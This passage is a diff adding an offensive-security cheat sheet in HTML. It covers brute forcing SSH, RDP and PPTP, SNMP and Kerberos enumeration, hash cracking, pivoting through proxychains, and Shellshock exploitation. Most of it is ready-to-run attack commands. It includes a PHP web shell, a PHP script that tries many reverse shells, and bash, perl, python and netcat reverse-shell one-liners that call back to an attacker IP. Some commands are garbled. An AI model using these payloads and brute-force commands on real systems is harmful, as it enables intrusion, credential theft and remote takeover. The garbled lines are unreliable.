+            <legend>SSH</legend>
+                <ul>
+                    <li><span>User enumeration</span></li>
+                <pre><code>msf&nbsp;&gt;&nbsp;use&nbsp;auxiliary/scanner/ssh/ssh_enumusers</code></pre>
+                <pre><code>$&nbsp;python&nbsp;/usr/share/exploitdb/platforms/linux/remote/40136.py&nbsp;-U&nbsp;/usr/share/wordlists/metasploit/unix_users.txt&nbsp;$ip</code></pre>
+                    <li><span>Bruteforce</span></li>
+                <pre><code>$&nbsp;hydra&nbsp;-v&nbsp;-V&nbsp;-l&nbsp;root&nbsp;-P&nbsp;password-file.txt&nbsp;$ip&nbsp;ssh </code></pre>
+                    <li><span>With list of users:</span></li>
+                <pre><code>$&nbsp;hydra&nbsp;-v&nbsp;-V&nbsp;-L&nbsp;user.txt&nbsp;-P&nbsp;/usr/share/wordlists/rockyou.txt&nbsp;-t&nbsp;16&nbsp;<span class="blue">192.168.33.251</span>&nbsp;<span class="red">ssh</span></code></pre>
+                    <li><span>You can use *-w* to slow down</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>SSL</legend>
+                <ul>
+                    <li><span>Open a connection</span></li>
+                <pre><code>$&nbsp;openssl&nbsp;s_client&nbsp;-connect&nbsp;$ip:443</code></pre>
+                    <li><span>Basic SSL ciphers check</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;--script&nbsp;ssl-enum-ciphers&nbsp;-p&nbsp;443&nbsp;$ip</code></pre>
+                    <li><span>Look for unsafe ciphers such as Triple-DES and Blowfish</span></li>
+                    <li><span>Very complete tool for SSL auditing is testssl.sh, finds BEAST, FREAK, POODLE, heart bleed, etc...</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Simple  Network  Management  Protocol (SNMP)</legend>
+                <ul>
+                    <li><span>It is a network protocol used for collecting organizing and exchanging information between network devices</span></li>
+                    <li><span>Runs on managed switches, routers, and server OSs for monitoring purposes. SNMP is accessed upon providing a <strong>valid community string</strong> within a UDP datagram to port 161. It is usually public. Versions 1,2 and 3. You can see running processes, open ports, users, windows version, installed software.</span></li>
+                    <li><span>Enumeration</span></li>
+                <pre><code>$&nbsp;<span class="red">for</span>&nbsp;community&nbsp;<span class="blue">in</span>&nbsp;<span class="blue">public</span>&nbsp;<span class="blue">private</span>&nbsp;manager;&nbsp;<span class="blue">do</span>&nbsp;snmpwalk&nbsp;-c&nbsp;$community&nbsp;-v1&nbsp;$ip;&nbsp;done</code></pre>
+                <pre><code>$&nbsp;snmpwalk&nbsp;-c&nbsp;<span class="blue">public</span>&nbsp;-v1&nbsp;$ip</code></pre>
+                <pre><code>$&nbsp;snmpenum&nbsp;$ip&nbsp;<span class="blue">public</span>&nbsp;windows.txt</code></pre>
+                    <li><span>Less noisy:</span></li>
+                <pre><code>$&nbsp;snmpwalk&nbsp;-c&nbsp;<span class="blue">public</span>&nbsp;-v1&nbsp;$ip&nbsp;<span class="blue">1.3.6.1.4.1.77.1.2.25</span></code></pre>
+                    <li><span>Based on UDP, stateless and susceptible to UDP spoofing</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-sU&nbsp;--open&nbsp;-p&nbsp;<span class="blue">16110.1.1.1-254</span>&nbsp;-oG&nbsp;out.txt</code></pre>
+                <pre><code>$&nbsp;snmpwalk&nbsp;-c&nbsp;<span class="blue">public</span>&nbsp;-v1&nbsp;&nbsp;<span class="blue">10.1.1.1</span>&nbsp;#&nbsp;we&nbsp;need&nbsp;to&nbsp;know&nbsp;that&nbsp;there&nbsp;<span class="blue">is</span>&nbsp;a&nbsp;community&nbsp;called&nbsp;<span class="blue">public</span></code></pre>
+                <pre><code>$&nbsp;snmpwalk&nbsp;-c&nbsp;<span class="blue">public</span>&nbsp;-v1&nbsp;<span class="blue">192.168.11.204</span>&nbsp;<span class="blue">1.3.6.1.4.1.77.1.2.25</span>&nbsp;#&nbsp;enumerate&nbsp;windows&nbsp;users</code></pre>
+                <pre><code>$&nbsp;snmpwalk&nbsp;5c&nbsp;<span class="blue">public</span>&nbsp;5v1&nbsp;<span class="blue">192.168.11.204</span>&nbsp;<span class="blue">1.3.6.1.2.1.25.4.2.1.2</span>&nbsp;#&nbsp;enumerates&nbsp;running&nbsp;processes</code></pre>
+                <pre><code>$&nbsp;nmap&nbsp;-vv&nbsp;-sV&nbsp;-sU&nbsp;-Pn&nbsp;-p&nbsp;161,162&nbsp;--script=snmp-netstat,snmp-processes&nbsp;$ip</code></pre>
+                <pre><code>$&nbsp;snmp-check&nbsp;-t&nbsp;$ip&nbsp;-c&nbsp;<span class="blue">public</span></code></pre>
+                    <li><span>Bruteforce the community names:</span></li>
+                <pre><code>$&nbsp;onesixtyone&nbsp;-c&nbsp;dict.txt&nbsp;-i&nbsp;$ip</code></pre>
+                    <li><span>Against cisco:</span></li>
+                <pre><code>use&nbsp;auxiliary/scanner/snmp/cisco_config_tftp</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>POP3</legend>
+                <ul>
+                    <li><span>Test authentication:</span></li>
+                <pre><code>telnet&nbsp;$ip&nbsp;110
+USER&nbsp;uer@$ip
+PASS&nbsp;admin
+list
+retr&nbsp;1</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Finger</legend>
+                <ul>
+                    <li><span>Users enumeration</span></li>
+                <pre><code>$&nbsp;finger-user-enum.pl&nbsp;-U&nbsp;users.txt&nbsp;-t&nbsp;$ip</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>RDP</legend>
+                <ul>
+                    <li><span>Bruteforce</span></li>
+                <pre><code>$&nbsp;ncrack&nbsp;-vv&nbsp;--user&nbsp;administrator&nbsp;-P&nbsp;password-file.txt&nbsp;rdp://$ip</code></pre>
+                <pre><code>$&nbsp;hydra&nbsp;-t&nbsp;4&nbsp;&nbsp;-l&nbsp;administrator&nbsp;-P&nbsp;/usr/share/wordlists/rockyou.txt&nbsp;rdp://$ip</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>RPC</legend>
+                <ul>
+                    <li><span>Enum</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;$ip&nbsp;--script=msrpc-enum</code></pre>
+                    <li><span>Exploit:</span></li>
+                <pre><code>msf&nbsp;&gt;&nbsp;use&nbsp;exploit/windows/dcerpc/ms03_026_dcom</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Kerberos</legend>
+                <ul>
+                    <li><span>Test MS14-068</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>LDAP</legend>
+                <ul>
+                    <li><span>Enumeration:</span></li>
+                <pre><code>$&nbsp;ldapsearch&nbsp;-h&nbsp;$ip&nbsp;-p&nbsp;389&nbsp;-x&nbsp;-b&nbsp;<span class="green">"dc=mywebsite,dc=com"</span></code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Kerberos</legend>
+                <ul>
+                    <li><span>Runs on port 88, password management port 464.</span></li>
+                    <li><span>Passive network sniffing:</span></li>
+                <pre><code>$&nbsp;kerbcrack</code></pre>
+                    <li><span>User enumeration:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;-p88&nbsp;--script&nbsp;krb5-enum-users&nbsp;--script-args&nbsp;krb5-enum-users.realm=research&nbsp;$ip</code></pre>
+                    <li><span>Memory password extraction (pass the ticket):</span></li>
+                <pre><code>$&nbsp;Mimikatz</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Email addresses enumeration</legend>
+                <ul>
+                    <li><span>Find emails in google, bing, pgp etc</span></li>
+                <pre><code>$&nbsp;theharvester&nbsp;-d&nbsp;$ip&nbsp;-b&nbsp;google</code></pre>
+                    <li><span>Contact information for the domains they host</span></li>
+                <pre><code>$&nbsp;whois&nbsp;$ip</code></pre>
+                    <li><span>Find emails and employee name with Recon-ng:</span></li>
+                <pre><code>$&nbsp;recon-ng;&nbsp;use&nbsp;module;&nbsp;set&nbsp;DOMAIN&nbsp;$ip;&nbsp;run;
+recon/contacts/gather/http/api/whois_pocs</code></pre>
+                    <li><span>Find xss published ad xssed.co</span></li>
+                <pre><code>recon/hosts/enum/http/web/xssed</code></pre>
+                    <li><span>Find subdomain</span></li>
+                <pre><code>recon/hosts/gather/http/web/google_site</code></pre>
+                    <li><span>Finds IPs close to the domain and possible new domains</span></li>
+                <pre><code>recon/hosts/gather/http/web/ip_neighbor</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Google search</legend>
+                <ul>
+                    <li><span>site:xxx -site:www.xxx</span></li>
+                    <li><span>filetype: look for specific documents, pdf, docx, etc..</span></li>
+                    <li><span>inurl</span></li>
+                    <li><span>intitle</span></li>
+                    <li><span>Others https://www.exploit-db.com/google-hacking-database/</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Vulnerability scanning</legend>
+                <ul>
+                    <li><span>Search services vulnerabilities</span></li>
+                <pre><code>$&nbsp;searchsploit&nbsp;--exclude=dos&nbsp;-t&nbsp;apache&nbsp;2.2.3</code></pre>
+                <pre><code>$&nbsp;msfconsole;&nbsp;&gt;&nbsp;search&nbsp;apache&nbsp;2.2.3</code></pre>
+                <pre><code>$&nbsp;nmap&nbsp;-v&nbsp;-T4&nbsp;--script=<span class="green">"*-vuln-*"</span>&nbsp;$ip</code></pre>
+                    <li><span>nmap has many vulnerability scanning NSE scripts in /usr/share/nmap/scripts/</span></li>
+                    <li><span>OpenVAS</span></li>
+                        <ul>
+                            <li><span>Powerful vulnerability scanner with thousands of scan checks. Setup:</span></li>
+                        </ul>
+                <pre><code>$&nbsp;openvas-setup;&nbsp;openvas-adduser;&nbsp;gsd</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Password cracking</legend>
+                <ul>
+                    <li><span>MD5 32 hex characters.</span></li>
+                    <li><span>SHA-1 40 hex characters.</span></li>
+                    <li><span>SHA-256 64 hex characters.</span></li>
+                    <li><span>SHA-512 128 hex characters.</span></li>
+                    <li><span>Find the type of hash:</span></li>
+                <pre><code>$&nbsp;hash-identifier</code></pre>
+                    <li><span>Find hash type at https://hashkiller.co.uk</span></li>
+                    <li><span>Running john will tell you the hash type even if you don't want to crack it:</span></li>
+                <pre><code>$&nbsp;john&nbsp;hashes.txt</code></pre>
+                    <li><span>Paste the entire /etc/shadow in file and run</span></li>
+                <pre><code>$&nbsp;john&nbsp;hashes.txt</code></pre>
+                    <li><span>Paste the entire /etc/shadow in file and run</span></li>
+                <pre><code>$&nbsp;john&nbsp;hashes.txt</code></pre>
+                    <li><span>GPU cracking:</span></li>
+                <pre><code>$&nbsp;hashcat&nbsp;-m&nbsp;500&nbsp;-a&nbsp;0&nbsp;-o&nbsp;output.txt&nbsp;-remove&nbsp;hashes.txt&nbsp;/usr/share/wordlists/rockyou.txt</code></pre>
+                    <li><span>CPU cracking:</span></li>
+                <pre><code>$&nbsp;john&nbsp;--wordlist=/usr/share/wordlists/rockyou.txt&nbsp;<span class="blue">127.0.0.1.pwdump</span></code></pre>
+                    <li><span>Cracking */etc/shadow*:</span></li>
+                <pre><code>$&nbsp;unshadow&nbsp;/etc/passwd&nbsp;/etc/shadow&nbsp;/tmp/combined;&nbsp;john&nbsp;--wordlist=&lt;any&nbsp;word&nbsp;list&gt;&nbsp;/tmp/combined</code></pre>
+                    <li><span>Generating wordlists</span></li>
+                <pre><code>$&nbsp;crunch&nbsp;6&nbsp;6&nbsp;0123456789ABCDEF&nbsp;5o&nbsp;crunch1.txt</code></pre>
+                    <li><span>Online rainbow tables:</span></li>
+                <pre><code><span class="blue">https://crackstation.net/
+http://www.cmd5.org/
+http://crackhash.com/
+https://hashkiller.co.uk/md5-decrypter.aspx
+https://www.onlinehashcrack.com/
+http://rainbowtables.it64.com/
+http://www.md5online.org/</span></code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Transfering files</legend>
+                <ul>
+                    <li><span>First step after gaining access to a remote machine is to upload new tools.</span></li>
+                    <li><span>Linux tools: netcat, curl, wget</span></li>
+                    <li><span>Windows: ftp, tftp, power shell script to echo and write.</span></li>
+                    <li><span>Download file with curl:</span></li>
+                <pre><code>$&nbsp;curl&nbsp;-O&nbsp;<span class="blue">http://host/file</span></code></pre>
+                    <li><span>Upload a file with put:</span></li>
+                <pre><code>$&nbsp;curl&nbsp;--upload-file&nbsp;shell.php&nbsp;--url&nbsp;http://$ip/shell.php&nbsp;--http1.0</code></pre>
+                    <li><span>Start a web server in your local machine serving files within the current folder:</span></li>
+                <pre><code>$&nbsp;python&nbsp;-m&nbsp;SimpleHTTPServer</code></pre>
+                <pre><code>$&nbsp;php&nbsp;-S&nbsp;$ip:80</code></pre>
+                    <li><span>Send files using different commands:</span></li>
+                <pre><code>$&nbsp;nc&nbsp;-nlvp&nbsp;4444&nbsp;&gt;&nbsp;incoming.exe</code></pre>
+                    <li><span>As an FTP server, metasploit has built in one:</span></li>
+                <pre><code>use&nbsp;auxiliary/server/ftp
+auxiliary/server/tftp</code></pre>
+                    <li><span>SMB share server:</span></li>
+                <pre><code>python&nbsp;smbserver.py&nbsp;WORKSPACE&nbsp;/dir</code></pre>
+                    <li><span>Curl put:</span></li>
+                <pre><code>$&nbsp;curl&nbsp;-T&nbsp;<span class="green">'file'</span>&nbsp;<span class="green">'http://$ip'</span></code></pre>
+                    <li><span>Linux, mounting a samba share:</span></li>
+                <pre><code>smbclient&nbsp;-L&nbsp;<span class="blue">1.1.1.1</span>&nbsp;--no-pass</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Shellshock</legend>
+                <ul>
+                    <li><span>The following tool will test it.</span></li>
+                <pre><code>$&nbsp;git&nbsp;clone&nbsp;<span class="blue">https://github.com/nccgroup/shocker;</span>&nbsp;<span class="red">cd</span>&nbsp;shocker;&nbsp;./shocker.py&nbsp;-H&nbsp;$ip&nbsp;&nbsp;--command&nbsp;<span class="green">"/bin/cat /etc/passwd"</span>&nbsp;-c&nbsp;/cgi-bin/status&nbsp;--verbose;&nbsp;&nbsp;./shocker.py&nbsp;-H&nbsp;$ip&nbsp;&nbsp;--command&nbsp;<span class="green">"/bin/cat /etc/passwd"</span>&nbsp;-c&nbsp;/cgi-bin/admin.cgi&nbsp;--verbose</code></pre>
+                    <li><span>You can also:</span></li>
+                <pre><code>$&nbsp;<span class="red">echo</span>&nbsp;-e&nbsp;<span class="green">"HEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\n"</span>&nbsp;|&nbsp;nc&nbsp;$ip&nbsp;80</code></pre>
+                <pre><code>$&nbsp;curl&nbsp;-x&nbsp;TARGETADDRESS&nbsp;-H&nbsp;<span class="green">"User-Agent: () { ignored;};/bin/bash -i &gt;&amp; /dev/tcp/HOSTIP/1234 0&gt;&amp;1"</span>&nbsp;$ip/cgi-bin/status</code></pre>
+                    <li><span>Shellshock over SSH:</span></li>
+                <pre><code>$&nbsp;<span class="red">ssh</span>&nbsp;username@$ip&nbsp;<span class="green">'() { :;}; /bin/bash'</span></code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>HeartBleed</legend>
+                <ul>
+                    <li><span>Test web server</span></li>
+                <pre><code>$&nbsp;sslscan&nbsp;$ip:443</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Tunneling your traffic through another host</legend>
+                <ul>
+                <pre><code>$&nbsp;sshuttle&nbsp;-r&nbsp;root@$ip&nbsp;<span class="blue">10.10.10.0/24</span></code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Port forwarding</legend>
+                <ul>
+                    <li><span>Simplest type of traffic redirection, consists on accepting traffic from one address and port port and redirecting it to another address and port.</span></li>
+                    <li><span>It can be useful to bypass address and port based filters. Rinetd is a linux tool to do it.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Local port forwarding</legend>
+                <ul>
+                    <li><span>Creates an encrypted tunnel through two machines and have traffic redirected to a final host and port, similar to port forwarding This is useful when you are trying to connect from your machine to a destination using a gateway. The syntax is:</span></li>
+                <pre><code>$&nbsp;<span class="red">ssh</span>&nbsp;gateway_host&nbsp;-L&nbsp;local_port:remote_host:remote_port</code></pre>
+                    <li><span>You can later create a SSH session to the local port and have and SSH tunneled to destination:</span></li>
+                <pre><code>$&nbsp;<span class="red">ssh</span>&nbsp;hop_machine&nbsp;-L&nbsp;31337:banned_machine:22
+$&nbsp;<span class="red">ssh</span>&nbsp;-p&nbsp;31337&nbsp;localhost</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Remote port forwarding</legend>
+                <ul>
+                    <li><span>It creates a tunnel from the target machine to your local machine, which allows connecting to an arbitrary port on the target. Useful if the target is in a non-routable network from your local machine.  This is useful when you are trying to connect to a host, behind a firewall that blocks incoming connections. This technique works as the previous one, but the connection is started from the gateway. The syntax is:</span></li>
+                <pre><code>$&nbsp;<span class="red">ssh</span>&nbsp;&lt;gateway&gt;&nbsp;-R&nbsp;&lt;remote&nbsp;port&nbsp;to&nbsp;bind&gt;:&lt;local&nbsp;host&gt;:&lt;local&nbsp;port&gt;</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Dynamic Port Forwarding</legend>
+                <ul>
+                    <li><span>Allows to create a tunnel from the target to your machine, and have the traffic routed to any host through target. You can configure a local port to forward traffic to multiple destinations passing through a single host. It is similar to local port forwarding but allows multiple destinations. It uses the SOCKS protocol. The syntax is:</span></li>
+                <pre><code>$&nbsp;<span class="red">ssh</span>&nbsp;-D&nbsp;local_port&nbsp;remote_add&nbsp;</code></pre>
+                    <li><span>The connection of the previous command is established at port 22 of remote addr.</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Pivoting</legend>
+                <ul>
+                    <li><span>1. drop 3proxy.exe</span></li>
+                    <li><span>2. Set up a config file:</span></li>
+                <pre><code>&nbsp;allow&nbsp;*_
+internal&nbsp;IP_SAME_NETWORK
+external&nbsp;IP_OTHER_NETWORK
+socks&nbsp;-p1081</code></pre>
+                    <li><span>3. Add to */etc/proxychains.conf*:</span></li>
+                <pre><code>socks4&nbsp;&nbsp;IP_SAME_NETWORK&nbsp;1081</code></pre>
+                    <li><span>4. Scan:</span></li>
+                <pre><code>$&nbsp;proxychains&nbsp;nmap&nbsp;-sT&nbsp;-Pn&nbsp;IP_OTHER_NETWORK-250&nbsp;--top-ports=5</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Double-pivoting</legend>
+                <ul>
+                    <li><span>Pivoting through two different networks:</span></li>
+                    <li><span>First, create a dynamic port forwarding through the first network:</span></li>
+                <pre><code>$&nbsp;<span class="red">ssh</span>&nbsp;-f&nbsp;-N&nbsp;-D&nbsp;9050&nbsp;<span class="blue">root@10.1.2.1</span></code></pre>
+                    <li><span>Edit */etc/proxychains.conf* and add as default gateway:</span></li>
+                <pre><code>socks4&nbsp;<span class="blue">127.0.0.1</span>&nbsp;9050</code></pre>
+                    <li><span>Use the proxy to create a second dynamic port forward to the second network:</span></li>
+                <pre><code>$&nbsp;proxychains&nbsp;<span class="red">ssh</span>&nbsp;-f&nbsp;-N&nbsp;-D&nbsp;10050&nbsp;<span class="blue">root@10.1.2.1</span>&nbsp;-p&nbsp;22</code></pre>
+                    <li><span>Edit again */etc/proxychains.conf* and add as default gateway:</span></li>
+                <pre><code>socks4&nbsp;<span class="blue">127.0.0.1</span>&nbsp;10050</code></pre>
+                    <li><span>You can now use proxychains to pivot to the target network:</span></li>
+                <pre><code>$&nbsp;proxychains&nbsp;nmap&nbsp;-sTV&nbsp;-n&nbsp;-PN&nbsp;<span class="blue">10.1.2.1</span>&nbsp;-254</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>CVEs</legend>
+                <ul>
+                <pre><code><span class="blue">http://www.cvedetails.com/
+https://www.exploit-db.com/</span></code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Internet explorer 6</legend>
+                <ul>
+                    <li><span>Vulnerable to msf exploit(ms10_002_aurora)</span></li>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Lists</legend>
+                <ul>
+                <pre><code>/usr/share/seclists/
+/usr/share/wordlist/
+/usr/share/metasploit-framework/data/wordlists/</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Minimal web server</legend>
+                <ul>
+                <pre><code>$&nbsp;<span class="red">for</span>&nbsp;i&nbsp;<span class="blue">in</span>&nbsp;1&nbsp;2&nbsp;3&nbsp;4&nbsp;5&nbsp;6&nbsp;7;&nbsp;<span class="blue">do</span>&nbsp;<span class="red">echo</span>&nbsp;-e&nbsp;<span class="green">'200 OK HTTP/1.1\r\nConnection:close\r\n\r\nfoo\r\n'</span>&nbsp;|nc&nbsp;-q&nbsp;0&nbsp;-klvvp&nbsp;80;&nbsp;done</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Shells</legend>
+                <ul>
+                    <li><span>PHP</span></li>
+                <pre><code>&lt;?php&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'&lt;pre&gt;'</span>;&nbsp;<span class="red">echo</span>&nbsp;<span class="green">shell_exec</span>($_GET[<span class="green">'cmd'</span>]);&nbsp;<span class="red">echo</span>&nbsp;<span class="green">'&lt;/pre&gt;'</span>;&nbsp;?&gt;</code></pre>
+                    <li><span>Kali shells</span></li>
+                <pre><code>/usr/share/webshells/...</code></pre>
+                <pre><code>/usr/share/webshells/php/php-reverse-shell.php</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Reverse shells</legend>
+                <ul>
+                    <li><span>If connections drops or can not be established, try different ports 80,443,8080...</span></li>
+                    <li><span>Best PHP reverse shell:</span></li>
+                <pre><code>&lt;?php
+echo&nbsp;<span class="green">'running shell'</span>;
+$ip=<span class="green">'YOUR_IP'</span>;
+$port=<span class="green">'YOUR_PORT'</span>;
+$reverse_shells&nbsp;=&nbsp;<span class="green">array</span>(
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">'/bin/bash -i &gt; /dev/tcp/'</span>.$ip.<span class="green">'/'</span>.$port.<span class="green">' 0&lt;&amp;1 2&gt;&amp;1'</span>,
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">'0&lt;&amp;196;exec 196&lt;&gt;/dev/tcp/'</span>.$ip.<span class="green">'/'</span>.$port.<span class="green">'; /bin/sh &lt;&amp;196 &gt;&amp;196 2&gt;&amp;196'</span>,
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">'/usr/bin/nc '</span>.$ip.<span class="green">' '</span>.$port.<span class="green">' -e /bin/bash'</span>,
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">'nc.exe -nv '</span>.$ip.<span class="green">' '</span>.$port.<span class="green">' -e cmd.exe'</span>,
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">"/usr/bin/perl -MIO -e '</span><span class="green">$p=fork;exit,if</span>($p);$c=new&nbsp;<span class="green">IO::Socket::INET</span>(PeerAddr,\<span class="green">""</span>.$ip.<span class="green">":"</span>.$port.<span class="green">"\"</span><span class="green">);STDIN-&gt;fdopen</span>(<span class="green">$c,r);$~-&gt;fdopen</span>($c,w);system$_&nbsp;while&lt;&gt;;<span class="green">'"</span>,
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">'rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet '</span>.$ip.<span class="green">' '</span>.$port.<span class="green">' 0/tmp/p'</span>,
+&nbsp;&nbsp;&nbsp;&nbsp;<span class="green">'perl -e \'</span>use&nbsp;Socket;$i=<span class="green">"'</span>.$ip.<span class="green">'"</span>;$p=<span class="green">'.$port.'</span><span class="green">;socket</span>(<span class="green">S,PF_INET,SOCK_STREAM,getprotobyname</span>(<span class="green">"tcp"</span><span class="green">));if</span>(<span class="green">connect</span>(<span class="green">S,sockaddr_in</span>(<span class="green">$p,inet_aton</span>(<span class="green">$i)))){open</span>(STDIN,<span class="green">"&gt;&amp;S"</span><span class="green">);open</span>(STDOUT,<span class="green">"&gt;&amp;S"</span><span class="green">);open</span>(STDERR,<span class="green">"&gt;&amp;S"</span><span class="green">);exec</span>(<span class="green">"/bin/sh -i"</span>);};\<span class="green">''</span>
+);
+foreach&nbsp;($reverse_shells&nbsp;<span class="blue">as</span>&nbsp;$reverse_shell)&nbsp;{
+&nbsp;&nbsp;&nbsp;<span class="blue">try</span>&nbsp;{echo&nbsp;<span class="green">system</span>($reverse_shell);}&nbsp;<span class="blue">catch</span>&nbsp;(Exception&nbsp;$e)&nbsp;{echo&nbsp;$e;}
+&nbsp;&nbsp;&nbsp;<span class="blue">try</span>&nbsp;<span class="green">{shell_exec</span>($reverse_shell);}&nbsp;<span class="blue">catch</span>&nbsp;(Exception&nbsp;$e)&nbsp;{echo&nbsp;$e;}
+&nbsp;&nbsp;&nbsp;<span class="blue">try</span>&nbsp;<span class="green">{exec</span>($reverse_shell);}&nbsp;<span class="blue">catch</span>&nbsp;(Exception&nbsp;$e)&nbsp;{echo&nbsp;<span class="green">$e;}
+}
+system</span>(<span class="green">'id'</span>);
+?&gt;</code></pre>
+                    <li><span>Using netcat</span></li>
+                <pre><code>nc&nbsp;&lt;attacker_ip&gt;&nbsp;&lt;port&gt;&nbsp;-e&nbsp;/bin/bash</code></pre>
+                    <li><span>Using bash and TCP sockets</span></li>
+                <pre><code>/bin/bash&nbsp;-i&nbsp;&gt;&nbsp;/dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt;&nbsp;0&lt;&amp;1&nbsp;2&gt;&amp;1</code></pre>
+                    <li><span>Using sh and TCP sockets</span></li>
+                <pre><code>0&lt;&amp;196;exec&nbsp;196&lt;&gt;/dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt;;&nbsp;sh&nbsp;&lt;&amp;196&nbsp;&gt;&amp;196&nbsp;2&gt;&amp;196</code></pre>
+                    <li><span>Using telnet</span></li>
+                <pre><code>telnet&nbsp;&lt;attacker_ip&gt;&nbsp;&lt;1st_port&gt;&nbsp;|&nbsp;/bin/bash&nbsp;|&nbsp;telnet&nbsp;&lt;attacker_ip&gt;&nbsp;&lt;2nd_port&gt;</code></pre>
+                    <li><span>PHP and sh</span></li>
+                <pre><code>php&nbsp;-r&nbsp;<span class="green">'$sock=fsockopen("</span>&lt;attacker_ip&gt;<span class="green">",&lt;port&gt;);exec("</span>/bin/sh&nbsp;-i&nbsp;&lt;&amp;3&nbsp;&gt;&amp;3&nbsp;2&gt;&amp;3<span class="green">");'</span></code></pre>
+                    <li><span>Perl and sh</span></li>
+                <pre><code>perl&nbsp;-e&nbsp;<span class="green">'use Socket;$i="</span>&lt;attacker_ip&gt;<span class="green">";$p=&lt;port;socket(S,PF_INET,SOCK_STREAM,getprotobyname("</span>tcp<span class="green">"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"</span>&gt;&amp;S<span class="green">");open(STDOUT,"</span>&gt;&amp;S<span class="green">");open(STDERR,"</span>&gt;&amp;S<span class="green">");exec("</span>/bin/sh&nbsp;-i<span class="green">");};'</span></code></pre>
+                    <li><span>Perl forking:</span></li>
+                <pre><code>$&nbsp;perl&nbsp;-MIO&nbsp;-e&nbsp;<span class="green">'$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"</span>ip:port<span class="green">");STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;'</span></code></pre>
+                    <li><span>Python</span></li>
+                <pre><code>python&nbsp;-c&nbsp;<span class="green">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</span>&lt;attacker_ip&gt;<span class="green">",&lt;port&gt;));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["</span>/bin/sh<span class="green">","</span>-i<span class="green">"]);'</span></code></pre>
+                    <li><span>Reverse shell with python script:</span></li>
+                <pre><code>#!/usr/bin/python
+import&nbsp;<span class="green">socket,subprocess,os
+s=socket.socket</span>(<span class="green">socket.AF_INET,socket.SOCK_STREAM)
+s.connect</span>((<span class="green">"IP"</span><span class="green">,port))
+os.dup2</span>(<span class="green">s.fileno</span>(<span class="green">),0)
+os.dup2</span>(<span class="green">s.fileno</span>(<span class="green">),1)
+os.dup2</span>(<span class="green">s.fileno</span>(<span class="green">),2)
+p=subprocess.call</span>([<span class="green">"/bin/sh"</span>,<span class="green">"-i"</span>])</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>Proxy</legend>
+                <ul>
+                    <li><span>Protocols</span></li>
+                <pre><code>http://
+http://
+connect://
+sock4://
+sock5://</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>PPTP</legend>
+                <ul>
+                    <li><span>Point-to-Point Tunneling Protocol provides remote access to mobile devices, uses TCP port 1723 for key exchange and IP protocol 47 (GRE) to encrypt data between peers.</span></li>
+                    <li><span>Enumeration:</span></li>
+                <pre><code>$&nbsp;nmap&nbsp;–Pn&nbsp;-sSV&nbsp;-p1723&nbsp;$ip</code></pre>
+                    <li><span>Bruteforce:</span></li>
+                <pre><code>$&nbsp;<span class="red">cat</span>&nbsp;dic.txt&nbsp;|&nbsp;thc-pptp-bruter&nbsp;–u&nbsp;admin&nbsp;$ip</code></pre>
+                </ul>
+        </fieldset>
+        <fieldset class="box">
+            <legend>IPsec</legend>
+                <ul>
